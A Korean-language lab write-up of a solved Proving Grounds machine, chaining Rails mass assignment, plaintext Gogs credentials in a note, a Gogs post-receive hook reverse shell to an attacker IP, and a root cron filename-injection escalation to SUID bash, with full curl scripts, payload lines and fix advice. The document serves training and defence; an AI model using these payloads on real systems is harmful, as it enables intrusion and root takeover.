---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/mass-assignment
  - tech/web/idor
  - tech/cred/reuse
  - tech/svc/gogs
  - tech/payload/revshell
  - tech/lin/cron
  - tech/web/cmd-injection
  - tech/lin/suid
type: machine
platform: pg
os: linux
ip: 192.168.248.224
ports: [22, 80, 8000]
services: [http, ssh]
status: solved
manual_tags: true
manual_cves: true
tech_count: 8
---

> [!info] 요약
> 타겟 `192.168.248.224` · Ubuntu 20.04.4 · Fundamental · 플래그 2개
> 진입점: 80(Rails `notes.pg`) 매스어사인먼트로 `role=owner` 계정 생성 → 남의 노트 열람 → Gogs 자격증명 `jane:svc-dev2022@@@!;P;4SSw0Rd` → 8000(Gogs 0.12.9) `post-receive` git hook RCE → jane
> 권한상승: root 크론 `find /dev/shm -type f -exec sh -c 'rm {}' \;` 파일명 인젝션 → SUID bash → root
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.224

### Initial Access – Rails 매스어사인먼트로 owner 계정을 만들어 타인의 노트에 평문 보관된 Gogs 관리자 자격증명을 회수하고 Git Hook 으로 원격 코드 실행

**Vulnerability Explanation:** 세 취약점이 체인됨.
- 가입 컨트롤러의 strong parameters 가 `params.require(:user).permit(:username, :password, :password_confirmation, :role)` 로 **권한 필드 `:role` 까지 허용** — 폼에 입력칸이 없어도 POST 에 `user[role]=owner` 를 얹으면 그대로 저장되는 매스어사인먼트
- 노트 조회 인가가 정책 객체가 아니라 **role 문자열 비교**(`current_user.role == "owner"`) 하나로 갈림. `/users/:id` 가 그 문자열을 화면에 그대로 렌더해 **정답 값까지 노출**
- Gogs 0.12.9 의 Git Hooks 는 저장소 관리자가 웹 UI 로 `post-receive` 본문을 편집하면 **Gogs 프로세스 사용자 권한으로 서버에서 실행**됨 — 「admin 자격증명 확보 = RCE 확보」. 여기서 그 사용자는 jane(`jane 850 ... /home/jane/gogs/gogs web`, 출처 `harvest_jane.txt` PROCS)

**Vulnerability Fix:**
- `permit` 목록에서 `:role` 제거. 권한 필드를 사용자 입력으로 채우지 말 것
- 인가를 문자열 비교가 아니라 정책 객체(Pundit/CanCanCan)로. `/users/:id` 가 role 을 렌더할 이유 자체가 없음
- 자격증명을 애플리케이션 노트에 평문 보관하지 말 것 — 이 박스의 실제 최초 원인
- Gogs 0.12.9 에서 Git Hooks 편집은 **설정 파일로 끌 수 없음.** 유일한 게이트가 사용자 속성이라 **관리자 계정 최소화 + `allow_git_hook` 회수**가 실제 완화책임 (근거: `internal/cmd/web.go` 의 `context.GitHookService()` → `internal/context/repo.go` → `internal/db/user.go` 의 `CanEditGitHook()` 이 `u.IsAdmin || u.AllowGitHook` 만 봄. v0.12.9 태그 소스 직접 확인)
- 서비스 계정에 Gogs 관리자 권한을 주지 말 것 — 이 박스는 jane 이 처음부터 admin 이라 자격증명 유출이 곧 RCE 가 됐음

**Severity:** Critical — 무인증 가입만으로 권한 승격 → 평문 자격증명 열람 → 원격 코드 실행

**Steps to reproduce the attack:**
1. `/register` 를 GET 해 `authenticity_token` 회수(쿠키 동반)
2. 가입 POST 에 `user[role]=owner` 를 얹어 owner 계정 생성
3. 로그인 후 `/notes/1` 열람 → Gogs 자격증명 `jane:svc-dev2022@@@!;P;4SSw0Rd` 회수
4. 8000 Gogs 에 jane 으로 로그인 — 이미 관리자
5. 저장소 생성 → `post-receive` 훅에 리버스셸 작성 → 웹 에디터 커밋으로 훅 발화
6. 리스너에서 jane 셸 수신 후 pty 승격

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.224 | TCP: 22, 80, 8000 |

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|_http-title: notes.pg
8000/tcp open  http    Golang net/http server
|_http-title: Gogs
```
— 출처: `~/PG/Assignment/nmap-quick.txt` (호스트키·fingerprint-strings 전문은 생략)

`-p-` 전수와 UDP top-100 도 돌렸으나 추가 포트 없음(`nmap-full.txt`, `nmap-udp-top100.txt`).

읽는 법 — 80 은 **버전이 안 뜸**. nmap 이 `GetRequest` 에 `HTTP/1.0 403 Forbidden` 을 받아 서비스 지문에 실패한 것이고, 실제로는 Rails(puma) 임. `http-title: notes.pg` 만 건짐. **8000 도 `Golang net/http server` 까지만** — Gogs 버전은 배너로 안 나옴.

**서비스 식별**

| 포트 | 실체 | 판정 근거 |
|---|---|---|
| 80 | Rails 앱 `notes.pg` | 응답 쿠키 `_simple_rails_session`, 헤더 `X-Request-Id`·`X-Runtime`, 본문의 `authenticity_token` |
| 8000 | Gogs 0.12.9 | `/admin` 의 Application version 표시 + `/home/jane/gogs/gogs` 빌드시각 `2022-06-07 05:03:46 UTC` |

![[PG-Assignment-gogs-landing.png]]

8000 의 비로그인 랜딩. **버전이 화면 어디에도 없음** — 하단 저작권은 `© 2026 Gogs` 로 연도만. 버전 근거 2개 원칙대로 웹 `/admin` 표시와 바이너리 빌드시각을 교차함. 배너만으로는 아무것도 안 나왔음.

`recon.sh` 가 Gogs 응답의 `Set-Cookie ... Domain=assignment.pg` 에서 호스트명 힌트 `assignment.pg` 를 뽑아줬으나 이 박스에서는 vhost 분기가 없어 쓰이지 않음.

**열거**

![[PG-Assignment-landing.png]]

80 의 랜딩. 하단 Contact 에 `jane@notes.pg` — 사용자명 힌트.

gobuster 결과(`gobuster-80.txt`)는 `/login`·`/register`·`/logout`·`/404` 뿐. **의미 있는 것은 로그인 이후에 나옴** — 인증 후 nav 에 `/dashboard`·`/users`·`/create` 가 붙음.

![[PG-Assignment-login.png]]

`/login` 화면. 입력은 username·password 둘뿐이고 계정 힌트는 푸터의 `jane@notes.pg` 하나임.

```text
$ curl -s http://192.168.248.224/register | grep -oE '<input[^>]*>'
<input type="hidden" name="authenticity_token" value="..." autocomplete="off" />
<input class="form-control" type="text" name="user[username]" id="user_username" />
<input class="form-control" type="password" name="user[password]" id="user_password" />
<input class="form-control" type="password" name="user[password_confirmation]" id="user_password_confirmation" />
```
— 출처: `~/PG/Assignment/manual/register.html`

![[PG-Assignment-register.png]]

화면에는 입력칸이 셋뿐. **폼에 role 칸이 없는 것이 role 을 못 보낸다는 뜻은 아님** — 이 박스의 전제가 그것임.

가입 파라미터가 `user[...]` 중첩 해시 — Rails 의 strong parameters 가 걸려 있다는 신호. 여기서 물어볼 것은 하나임: **`permit` 목록에 뭐가 더 들어 있나.**

### Initial Access – 매스어사인먼트 → Gogs hook RCE

**매스어사인먼트의 실물** — Rails 는 `params.require(:user).permit(...)` 로 허용 필드를 화이트리스트함. 폼에 없는 필드도 **`permit` 목록에만 있으면 요청으로 채울 수 있음.** 폼 HTML 은 화이트리스트가 아님.

이 앱의 컨트롤러 — root 획득 후 읽었다고 기록돼 있으나 **그 출력이 산출물로 보존되지 않았음.** `~/PG/Assignment/` 어디에도 이 소스가 없으므로 아래는 `[가정]` 으로 둠:

```ruby
# /var/www/rails-app/app/controllers/applicants_controller.rb  ← 출처 미보존 [가정]
  def user_params
    params.require(:user).permit(:username, :password, :password_confirmation, :role)
  end
```

**「`:role` 이 permit 목록에 있다」는 결론 자체는 소스 없이도 실측으로 성립함** — 아래 role 대조표에서 `user[role]` 은 반영되고 `user[admin]` 은 무시됐고, 만든 owner 계정이 실제로 타인 노트를 읽었음(`manual/note_1.html`). 가입 폼에는 role 입력칸이 없지만 POST 에 얹으면 그대로 들어감.

**힌트는 로그인만 하면 보임.** `/users` 가 전 회원을 ID 와 함께 나열하고, `/users/1` 이 role 값을 그대로 보여줌:

```text
$ curl -s -b cookie http://192.168.248.224/users/1
  <h3>User: 1</h3>
    <input type="text" class="form-control" value="jane" id="username" disabled>
    <input type="text" class="form-control" value="2022-05-20 16:48:21 UTC" id="created_at" disabled>
    <textarea class="form-control" id="role" disabled>owner</textarea>
```

즉 **써야 할 값(`owner`)을 앱이 알려줌.** 신규 가입 계정은 `member`.

![[PG-Assignment-members-owner.png]]

회원 목록. id 11 에 URL 인코딩된 요청 문자열이 통째로 사용자명으로 박혀 있고 id 13 이 `forged_owner` — **이전 사용자가 같은 공격을 시도한 흔적이 스냅샷에 남은 것** `[가정]`. 근거는 내가 만든 계정이 id 14 부터라는 것뿐이고 누가 언제 만들었는지는 관측 없음. 어쨌든 정답 파라미터명(`user[role]`)을 그대로 노출함.

**owner 계정 만들기** — 가입 요청에 `user[role]=owner` 한 줄 추가. CSRF 토큰은 `/register` 를 GET 해서 뽑아 씀.

```bash
# ~/PG/Assignment/manual/reg.sh — 원문 발췌. role 은 인자로 넘김
TOK=$(curl -s -c "$J" "$T/register" | grep -oP 'name="authenticity_token" value="\K[^"]+' | head -1)
ARGS=()
for e in "$@"; do ARGS+=(-d "$e"); done
curl -s -b "$J" -c "$J" -o "resp_reg_$U.html" -w "REG %{http_code}\n" \
  -d "authenticity_token=$TOK" -d "user[username]=$U" -d "user[password]=Passw0rd!23" \
  -d "user[password_confirmation]=Passw0rd!23" "${ARGS[@]}" "$T/register"

# 호출부 — 첫 인자가 사용자명, 나머지가 추가 필드
./reg.sh mass_owner   'user[role]=owner'
./reg.sh mass_admin   'user[role]=admin'
./reg.sh mass_admtrue 'user[admin]=true'
```
— 스크립트 본문은 `~/PG/Assignment/manual/reg.sh` 원문. 호출부는 스크립트에 안 남아 있고 산출물 파일명(`cj_mass_owner.txt`·`resp_reg_mass_admtrue.html` 등)에서 역산한 것임 `[가정]`.

`-c`/`-b` 로 쿠키를 물리지 않으면 Rails 가 `authenticity_token` 을 세션과 대조하지 못해 **422** 를 뱉음. 토큰만 복사해서는 안 됨.

후보를 순차로 하나씩 던지지 않고 `owner`·`admin`·`user[admin]=true` 세 개를 한 번에 쏜 뒤 `/users/<id>` 로 결과 role 을 대조함:

| 보낸 것 | 생성된 role |
|---|---|
| `user[role]=owner` | `owner` ✅ |
| `user[role]=admin` | `admin` (통과하지만 인가 분기는 `owner` 만 봄) |
| `user[admin]=true` | `member` (permit 밖이라 무시) |

세 계정은 13초 간격으로 연속 발사됐고(`resp_reg_*.html` mtime 09:23:51·09:24:04·09:24:17) 평가는 그 뒤에 한 번에 함. 다만 **`/users/15`~`/users/17` 의 role 화면은 보존되지 않았음** — 남아 있는 role 캡처는 `/users/1`(jane=`owner`) 하나뿐이라 2·3행은 `근거부족` 임 `[가정]`. 1행은 결과로 확증됨(owner 계정이 타인 노트를 읽음).

**인가가 role 문자열 하나로 갈림** — 노트 컨트롤러. 위와 같이 **출처 미보존이라 `[가정]`**:

```ruby
# /var/www/rails-app/app/controllers/notes_controller.rb  ← 출처 미보존 [가정]
  def show
    @note = Note.find(params[:id])
    if current_user.role == "owner" || @note.user.id == current_user.id
      return @note
    end
    redirect_to :dashboard, flash: { error: "Insufficient rights!" }
  end
```

`role == "owner"` 면 **모든 노트**를 봄. 위에서 만든 계정이 그대로 통과. 실측 근거는 소스가 아니라 결과임 — jane(id 1) 소유의 `/notes/1` 본문을 신규 계정이 받아냄(`manual/note_1.html`, 5398바이트 정상 본문).

**노트에서 Gogs 자격증명 회수:**

```text
$ curl -s -b cookie http://192.168.248.224/notes/1
  <h3>Note 1</h3>
    <input type="text" class="form-control" value="jane" id="author" disabled>
    <input type="text" class="form-control" value="API creds" id="title" disabled>
    <textarea class="form-control" disabled>my creds for gogs: jane:svc-dev2022@@@!;P;4SSw0Rd</textarea>
```

![[PG-Assignment-note1-creds.png]]

노트 1~4 만 존재. 2번은 jane 의 TODO, 3·4번은 jim 의 잡담.

⚠️ 비밀번호에 `;`·`@`·`!` 가 들어 있음. 셸에 그대로 넣으면 깨지므로 **작은따옴표로 감싸거나 `--data-urlencode`** 를 쓸 것.

**Gogs 로그인 — 승격은 필요 없었음:**

```bash
curl -s -b $J -c $J --data-urlencode "_csrf=$TOK" \
  --data-urlencode "user_name=jane" --data-urlencode "password=svc-dev2022@@@!;P;4SSw0Rd" \
  http://192.168.248.224:8000/user/login
```

— 스크립트 원문은 `~/PG/Assignment/manual/gogs.sh`(위는 변수를 펼치고 `-o`/`-w` 를 뺀 것).

302 → `/`. 응답 본문은 0바이트(`manual/gogs_login.html`)이고, 뒤이어 받은 홈(`manual/gogs_home.html`)에 `/admin` 링크가 있음 = **jane 은 이미 Gogs 관리자.** 별도 승격 단계 없음.

![[PG-Assignment-gogs-jane-admin.png]]

**Gogs Git Hooks 는 취약점이라기보다 관리자에게 주어진 기능임.** 저장소 Settings → Git Hooks 에서 `pre-receive`·`update`·`post-receive` 본문을 웹 UI 로 편집 가능하고, 그 스크립트가 Gogs 프로세스 사용자 권한으로 서버에서 실행됨 — 여기서는 jane. `app.ini` 의 `RUN_USER` 값을 직접 읽지는 않았고, 근거는 프로세스 소유자와 훅 프로세스 계보임(`harvest_jane.txt`: `jane 850 /home/jane/gogs/gogs web` → `jane 2975 gogs hook --config=... post-receive`). 그래서 Gogs/Gitea 를 만나면 이것이 1순위 벡터임.

트리거는 push 가 아니어도 됨. **웹 에디터로 파일 하나 커밋하면 서버가 내부적으로 receive 를 돌면서 hook 을 실행함.**

⚠️ **이 기능은 `app.ini` 로 끌 수 없음.** v0.12.9 소스에서 훅 편집 라우트의 게이트는 `context.GitHookService()` 하나이고 그것이 부르는 `CanEditGitHook()` 은 `u.IsAdmin || u.AllowGitHook` 만 봄 — **설정 키를 전혀 참조하지 않음.** 이 박스의 `app.ini` 에 `ENABLE_GIT_HOOKS = false` 가 있었는데도 훅이 그대로 돈 이유가 이것임(Gogs 에는 그런 키 자체가 없음. 비슷한 이름의 `[security] DISABLE_GIT_HOOKS` 는 **Gitea** 설정임). 상세는 [[_PLAYBOOK#A-45. 크론이 안 보인다 / `find` 가 정답을 잘랐다]].

**post-receive 훅에 리버스셸** — 리스너부터:

```bash
ssh kali@10.44.44.128 "tmux new-session -d -s asg-rev443 'nc -lvnp 443; exec bash'"
```

저장소 생성 → 훅 작성 → 커밋 트리거의 3단계 모두 curl 로 처리(`manual/mkrepo2.sh`·`hook.sh`·`commit.sh`). 자동 도구는 쓸 자리가 없었고 전 과정이 curl 수동 요청임.

```bash
# 1) 저장소 생성  ⚠️ 소유자 필드는 uid 가 아니라 user_id (Gogs 0.12.9)
curl -s -b $J -c $J -d "_csrf=$TOK" -d "user_id=1" -d "repo_name=pgtest" \
  -d "readme=Default" -d "auto_init=on" -d "default_branch=master" \
  http://192.168.248.224:8000/repo/create

# 2) post-receive 훅
HOOK='#!/bin/bash
bash -i >& /dev/tcp/192.168.45.207/443 0>&1
'
curl -s -b $J -c $J --data-urlencode "_csrf=$TOK" --data-urlencode "content=$HOOK" \
  http://192.168.248.224:8000/jane/pgtest/settings/hooks/git/post-receive

# 3) 웹 에디터로 파일 커밋 → 훅 실행
curl -s -b $J -c $J --data-urlencode "_csrf=$TOK" --data-urlencode "tree_path=trigger.txt" \
  --data-urlencode "content=hi" --data-urlencode "commit_summary=add trigger" \
  --data-urlencode "commit_choice=direct" \
  http://192.168.248.224:8000/jane/pgtest/_new/master/
```

![[PG-Assignment-gogs-post-receive-hook.png]]

3번 요청은 **응답이 안 돌아옴** — 훅이 리버스셸을 붙든 채라 push 처리가 안 끝남. `timeout 25` 로 끊어도 셸은 살아 있음. 「요청이 멈춰 있다 = 실패」로 읽지 말 것.

리스너에 붙은 셸의 작업 디렉터리는 훅이 돌던 bare 저장소였음:
```text
jane@assignment:~/gogs-repositories/jane/pgtest.git$
```
— 이 한 줄은 tmux 페인에만 있었고 파일로 보존되지 않음. 다만 프로세스 계보가 뒷받침함 — `harvest_jane.txt` PROCS 에 `git-receive-pack /home/jane/gogs-repositories/jane/pgtest.git` 와 그 자손 `python3 -c import pty;pty.spawn("/bin/bash")` 가 그대로 찍혀 있음.

pty 승격 후 플래그 회수:
```bash
jane@assignment:~$ whoami; id; hostname; hostname -I; date; ls -la /home/jane; echo ---; cat /home/jane/local.txt
whoami; id; hostname; hostname -I; date; ls -la /home/jane; echo ---; cat /home/jane/local.txt
jane
uid=1000(jane) gid=1000(jane) groups=1000(jane)
assignment
192.168.248.224
Fri 21 Aug 2026 12:30:44 AM UTC
...
-rw------- 1 jane jane   33 Aug 21 00:02 local.txt
---
fb0d680dcb5aa5c1e7aeed44cb452afc
jane@assignment:~$
```
— 출처: `~/PG/Assignment/proof_user.txt` (`ls -la` 중간 행은 생략). **명령이 두 번 찍힌 것은 오타가 아니라 pty 로컬 에코임** — 웹셸이 아니라 대화형 셸에서 읽었다는 표식이라 그대로 둠.

> [!warning] 훅 안에서 `cat local.txt` 하지 말 것
> 훅은 「명령 실행」이지 대화형 셸이 아님. OSCP 규정상 웹 기반 셸로 읽은 플래그는 **0점**. 반드시 리버스셸 pty 를 잡고 원위치에서 읽을 것.

**Local.txt value:**
`fb0d680dcb5aa5c1e7aeed44cb452afc`

### Privilege Escalation – 크론 `find -exec sh -c '... {}'` 파일명 인젝션

**Vulnerability Explanation:** root 개인 crontab 이 매분 `/usr/bin/clean-tmp.sh` 를 돌리고, 그 스크립트가 `find /dev/shm -type f -exec sh -c 'rm {}' \;` 임.
- `{}` 는 find 가 **문자열 치환**으로 넣고, 치환 결과가 `sh -c` 의 인자 = **셸 소스코드**가 됨 → 파일명이 곧 명령(command injection)
- `/dev/shm` 이 `drwxrwxrwt` 라 비특권 사용자 jane 이 임의 파일명을 만들 수 있음
- 스크립트가 root 로 돌므로 주입된 명령도 root 로 실행됨

**Vulnerability Fix:**
- 크론 스크립트를 `find /dev/shm -type f -delete` 로 교체. 굳이 exec 를 쓴다면 `-exec rm -- {} +` 처럼 **셸을 끼우지 말 것**
- 웹앱을 root 로 돌리지 말 것 — 여기 puma 가 uid 0 이었음(별개 경로지만 같은 최소권한 위반)

**Severity:** Critical — 비특권 사용자가 파일 하나 만드는 것으로 매분 root 명령 실행, 즉시 root

**Steps to reproduce the attack:**
1. `harvest.sh` 열거 — sudo·SUID·getcap·`/etc/cron*` 전부 스톡이라 실마리 없음
2. 파일명 검색으로 `/usr/bin/clean-tmp.sh` 특정, 내용에서 `-exec sh -c 'rm {}'` 확인
3. `/dev/shm` 에 `a;chmod u+s $(command -v bash);` 파일 생성
4. 1분 대기 → `/bin/bash` 에 SUID 부여 확인
5. `bash -p` 진입 후 `setresuid(0,0,0)` 로 실제 uid 까지 0 으로 올림

**열거로 무엇을 발견했는가** — 셸 직후 `harvest.sh` 1회(`~/PG/Assignment/harvest_jane.txt`, 1300행).

```text
===== SUDO =====
sudo: a password is required
```
SUID·getcap 은 전부 스톡. `/etc/crontab`·`/etc/cron.d`·`/etc/cron.hourly`·`/etc/cron.daily` 도 전부 순정 Ubuntu.

**즉 열거 산출물만으로는 크론 벡터가 안 보임.** root 개인 crontab(`/var/spool/cron/crontabs/root`)은 jane 이 못 읽음.

두 갈래로 찾음.

1. **프로세스 관측** — pspy 를 올리려 했으나 Kali 패키지(`/usr/share/pspy/pspy64`·`pspy64s`) 둘 다 타겟에서 `GLIBC_2.34 not found` 로 죽음. `/proc` 폴러를 직접 짜서 대체 — 상세는 [[_PLAYBOOK]]
2. **파일명 검색** — 이쪽이 먼저 맞음

```text
$ find / -xdev \( -name '*.sh' -o -name 'clean*' \) -newermt '2022-01-01' \
    -not -path '/usr/share/*' -not -path '/snap/*' \
    -not -path '/var/www/rails-app/node_modules/*' -not -path '/usr/local/rvm/*' -type f 2>/dev/null
...
/usr/bin/clean-tmp.sh
...
```

```text
$ ls -la /usr/bin/clean-tmp.sh; cat /usr/bin/clean-tmp.sh
-rwxr-xr-x 1 root root 58 Aug  2  2022 /usr/bin/clean-tmp.sh
#! /bin/bash
find /dev/shm -type f -exec sh -c 'rm {}' \;
```
— 위 두 블록은 **리버스셸 안에서 실행한 것이라 로그가 보존되지 않음**(셸 내부 명령은 Kali `~/.zsh_history` 에도 안 남음). 다만 값은 별도 산출물과 일치함 — 크기 58·`Aug  2  2022`·스크립트 본문이 `root_crontab.txt` 의 root 캡처와 바이트 단위로 같음.

root 획득 후 확인한 스케줄:
```bash
root@assignment:/tmp# crontab -l; echo ---; cat /root/clean-tmp.sh; ls -la /usr/bin/clean-tmp.sh /root/clean-tmp.sh
crontab -l; echo ---; cat /root/clean-tmp.sh; ls -la /usr/bin/clean-tmp.sh /root/clean-tmp.sh
* * * * * /bin/bash /usr/bin/clean-tmp.sh
---
#! /bin/bash
find /dev/shm -type f -exec sh -c 'rm {}' \;
-rw-rw-r-- 1 root root 58 Jul 14  2022 /root/clean-tmp.sh
-rwxr-xr-x 1 root root 58 Aug  2  2022 /usr/bin/clean-tmp.sh
```
— 출처: `~/PG/Assignment/root_crontab.txt`. **매분 실행.** `/root/clean-tmp.sh` 는 원본 사본이고 크론이 실제로 도는 것은 `/usr/bin/` 쪽임.

**왜 그것이 권한상승이 되는가** — `{}` 치환 결과가 `sh -c` 에 넘어가는 셸 소스코드임.

`/dev/shm/hello` 라는 파일이면 `sh -c "rm /dev/shm/hello"` — 정상.
파일명에 `;` 를 넣으면 그 자리에서 명령이 끊기고 뒤가 새 명령이 됨.

```bash
sh -c "rm /dev/shm/a;<임의 명령>;"
```

`-exec rm {} \;`(셸 없음) 였으면 안 통함. **`sh -c` 로 감싼 것이 전부**임.

제약 하나 — 파일명에 `/` 를 못 씀. `chmod u+s /bin/bash` 를 그대로 못 넣음. `$(command -v bash)` 로 우회:

```bash
cd /dev/shm
touch 'a;chmod u+s $(command -v bash);'
```

`/dev/shm` 은 `drwxrwxrwt` 라 jane 이 쓸 수 있음. `rm /dev/shm/a` 는 그런 파일이 없어 실패하지만 무해하고, **트리거 파일 자체는 안 지워져 매분 반복 발화**함(정리 때 반드시 지울 것).

1분 뒤:
```text
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

**euid 만으로는 부족하다** — `/bin/bash -p` 는 euid=0·ruid=1000 상태. 여기서 `sh script.sh` 를 돌리면 **자식 dash 가 euid 를 ruid 로 되돌려** 권한이 조용히 빠짐. 그래서 실제 uid 까지 0 으로 올림:

```bash
/bin/bash -p
bash-5.0# python3 -c "import os;os.setresgid(0,0,0);os.setresuid(0,0,0);os.execl(chr(47)+chr(98)+chr(105)+chr(110)+chr(47)+chr(98)+chr(97)+chr(115)+chr(104),chr(98)+chr(97)+chr(115)+chr(104))"
python3 -c "import os;os.setresgid(0,0,0);os.setresuid(0,0,0);os.execl(chr(47)+chr(98)+chr(105)+chr(110)+chr(47)+chr(98)+chr(97)+chr(115)+chr(104),chr(98)+chr(97)+chr(115)+chr(104))"
root@assignment:/tmp#
```
— 출처: `~/PG/Assignment/proof_root.txt` 선두. 첫 줄은 `/bin/bash -p` 의 에코이고 그 앞 프롬프트는 캡처 범위 밖임.

(`chr()` 조합은 `tmux send-keys` → `ssh` 를 거치며 `/` 와 따옴표가 깨지는 것을 피하려는 것. 대화형 터미널이면 `os.execl("/bin/bash","bash")` 로 충분함.)

**안 쓴 다른 경로**

- **puma(Rails)가 root 로 돎** — `root 857 ... /usr/bin/bash -lc rvm use ruby-2.7.2; bundle exec rails s -b 0 --port 80` 과 그 자식 `root 1323 puma 5.6.4 (tcp://0:80) [rails-app]` 이 uid=0(출처 `harvest_jane.txt` PROCS). 앱 디렉터리에 쓸 수 있으면 곧바로 root 지만 **jane 권한 쓰기가능 디렉터리 전수 목록에 `/var/www` 계열이 하나도 없음**(`harvest_jane.txt` WRITABLE — `/var/crash`·`/var/tmp`·`/run/screen`·`/run/lock`·`/home/jane` 이하뿐) → **닫힘.** 디렉터리 소유자·모드 자체는 따로 찍어두지 않았음(관측 없음). 다만 root 로 도는 웹앱이라 RCE 급 웹 취약점이 하나만 더 있었으면 jane 단계를 건너뛸 수 있었음
- 커널 5.4.0-122 / Ubuntu 20.04.4 — DirtyPipe(CVE-2022-0847, 5.8+)는 **커널 버전으로 배제됨**
- PwnKit(CVE-2021-4034) — `/usr/bin/pkexec` 가 SUID 로 존재함(`harvest_jane.txt` SUID). **배제한 것이 아니라 시도하지 않은 것임** — 크론 경로가 먼저 열려서 손대지 않았고, 패치 여부는 `polkit` 패키지 버전을 확인하지 않아 **관측 없음**

### Post-Exploitation

**Proof.txt value:**
`73cb49cd19e6a8a4227a8544cfc27b4b`

```bash
root@assignment:/tmp# whoami; id; hostname; hostname -I; date; ls -la /root; echo ---; cat /root/proof.txt
whoami; id; hostname; hostname -I; date; ls -la /root; echo ---; cat /root/proof.txt
root
uid=0(root) gid=0(root) groups=0(root),1000(jane)
assignment
192.168.248.224
Fri 21 Aug 2026 12:46:17 AM UTC
...
-rw-------  1 root root   33 Aug 21 00:03 proof.txt
---
73cb49cd19e6a8a4227a8544cfc27b4b
root@assignment:/tmp#
```
— 출처: `~/PG/Assignment/proof_root.txt` (`ls -la /root` 중간 행은 생략). 명령 중복은 pty 로컬 에코임.

| | 경로 | 값 |
|---|---|---|
| user | `/home/jane/local.txt` | `fb0d680dcb5aa5c1e7aeed44cb452afc` |
| root | `/root/proof.txt` | `73cb49cd19e6a8a4227a8544cfc27b4b` |

**남긴 흔적** — 정리 증거 원문: `~/PG/Assignment/cleanup.txt` (root 셸에서 실행, 전후 비교 포함)

- `/bin/bash` — `u+s` 부여 후 **원복**. `-rwxr-xr-x`, md5 `23c415748ff840b296d0b93f98649dec` (권한상승 전 실측과 일치)
- `/dev/shm/'a;chmod u+s $(command -v bash);'` — 삭제 확인(`/dev/shm` 비어 있음)
- `/tmp` 업로드물(`.h.sh`·`.hj.txt`·`.p`·`.ps`·`.pspy.log`·`.pspy2.log`·`.w.sh`·`.w2.sh`·`.w.log`·`.w2.log`·`.wb.log`·`.seenpids`·`.plant.sh`·`.hunt.sh`)과 `/tmp/marker_a`·`/var/tmp/marker_a` — 삭제 확인. 목록은 `cleanup.txt` 3절의 삭제 전 `ls` 원문과 일치
- `/home/jane/.ssh/authorized_keys` — 삭제 확인(원래 `.ssh` 는 비어 있었음)
- Gogs 저장소 `jane/pgtest` — 웹 UI 로 삭제(이후 GET 404), `~/gogs-repositories/jane/` 도 빈 상태 확인
- Rails 계정 `probe1`·`mass_owner`·`mass_admin`·`mass_admtrue` — sqlite 에서 삭제 확인. **id 10~13 은 내가 만든 것이 아니라 스냅샷에 있던 것이라 그대로 둠**
- 감시 프로세스 — 종료 확인(`ps` 출력 비어 있음)
- Kali tmux `asg-http`·`rc-Assignment-full`·`rc-Assignment-gb` 종료, :8080 리스너 종료 확인

## 관련

- Rails Security Guide — Mass Assignment / Strong Parameters: <https://guides.rubyonrails.org/security.html#mass-assignment>
- Gogs 문서 — Git Hooks: <https://gogs.io/docs>
- GTFOBins `find`: <https://gtfobins.github.io/gtfobins/find/>
- GTFOBins `bash`(SUID): <https://gtfobins.github.io/gtfobins/bash/>
- 크론 기반 권한상승 — [[Astronaut]] · [[Exfiltrated]] · [[Muddy]]
- 「응답이 성공을 뜻하지 않는다」(Gogs 200 = 실패) — [[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Hawat]] · [[Squid]]
- 버전 판정은 독립 근거 2개 — [[Hub]] · [[Levram]] · [[RubyDome]] · [[Astronaut]] · [[Squid]]
**시행착오·기법 카드** — 이 박스에서 나온 것은 전부 [[_PLAYBOOK]] 로 이관됨:

- [[_PLAYBOOK#A-12. 응답이 성공을 뜻하지 않는다]] — Gogs 저장소 생성 200=실패 / 302=성공
- [[_PLAYBOOK#A-24. 한 서비스의 거부는 자격증명의 오류가 아니다]] — Gogs 비번으로 SSH 시도 실패
- [[_PLAYBOOK#A-33. 셸을 내 손으로 죽였다 — 인터랙티브 프롬프트와 `pkill -f`]]
- [[_PLAYBOOK#A-45. 크론이 안 보인다 / `find` 가 정답을 잘랐다]] — `head -20` 절단(약 10분 손실) · pspy GLIBC 실패 · `ENABLE_GIT_HOOKS` 함정
- [[_PLAYBOOK#B-19. Rails 매스어사인먼트 (strong parameters)]]
- [[_PLAYBOOK#B-22. Gogs / Gitea — Git Hooks 는 «설계된» RCE 다]]
- [[_PLAYBOOK#B-35. `find -exec sh -c '... {}'` 는 파일명 인젝션이다]]

- [[_STATUS]]
